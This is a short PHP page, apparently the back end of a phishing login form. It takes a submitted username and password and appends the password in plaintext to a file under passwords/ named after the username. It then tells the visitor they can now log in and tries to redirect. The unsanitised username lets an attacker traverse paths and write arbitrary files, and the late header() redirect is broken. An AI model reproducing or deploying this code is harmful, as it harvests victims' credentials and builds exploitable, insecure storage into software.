<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Welcome</title>
</head>
<body>

<?php 
header("Content-type: text/html; charset=utf-8");

$un = $_POST['username'];
$pw = $_POST['pass'];


$file = fopen("passwords/".$un, "a");
fwrite($file, "$pw");
fclose($file);

echo "Now you can log into your account, happy browsing";
sleep(5);
header("Location: index.php");

 ?>

</body>
</html>